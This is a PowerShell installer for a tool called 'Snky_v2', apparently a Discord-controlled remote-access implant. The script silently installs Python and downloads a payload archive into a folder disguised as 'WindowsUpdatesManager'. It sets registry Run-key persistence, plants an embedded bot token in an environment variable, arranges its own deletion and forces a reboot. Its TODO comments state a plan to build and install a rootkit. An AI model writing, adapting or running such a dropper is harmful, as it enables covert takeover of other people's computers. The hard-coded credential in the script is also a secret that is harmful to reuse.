#Snky_v2

#TODO:
#   Full python and snky installation - Download python 3.10.11; install python; install snky into localappdata/WindowsUpdatesManager - DONE
#   Token in environment variable, with an AES key attached to the end. Divided my "MMM" - Later add a key
#   Self destruction of install .ps1, probably through snky itself
#   Figure out a way for installing a rootkit and figure out how to make one  f a s t

$downLink = ""
$pythonLink = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
$ptnIn = "$($env:TEMP)\python.exe"

$token = "MTIyNTc5MTM4NjM2NDgwOTI1Ng.GgyZrr.lfp7eiYfTFxlNA4KIWTuR4vgCyJEgapPpA97YcMMM<KEY>"

Invoke-WebRequest -Uri $pythonLink -OutFile $ptnIn

Start-Process -FilePath $ptnIn -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
$pyp = Join-Path $env:ProgramFiles "Python310"
[System.Environment]::SetEnvironmentVariable("Path", "$($env:Path);$pyp","User")

Invoke-WebRequest -Uri $downLink -OutFile "$($env:TEMP)\program.zip"
Expand-Archive -Path "$($env:TEMP)\program.zip" -DestinationPath "$($env:LOCALAPPDATA)\" -Force

Rename-Item -Path "$($env:LOCALAPPDATA)\Snky-main" -NewName "WindowsUpdatesManager"

cmd.exe /c python -m pip install --upgrade pip
cmd.exe /c pip install -r "$($env:LOCALAPPDATA)\WindowsUpdatesManager\requirements.txt"

#STARTUP THROUGH REGISTRY
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdatesManager"
$regValue = "$($env:LOCALAPPDATA)\WindowsUpdatesManager\main.pyw"

New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force

New-ItemProperty -Path $regPath -Name "ToDestruct" -Value $MyInvocation.MyCommand.Path -PropertyType String -Force

[System.Environment]::SetEnvironmentVariable("TOKEN", "$($token)","User")

#TOKEN


#CLEANUP
Remove-Item -Path $ptnIn
Remove-Item -Path "$($env:TEMP)\program.zip"

cmd.exe /c shutdown /r /t 0

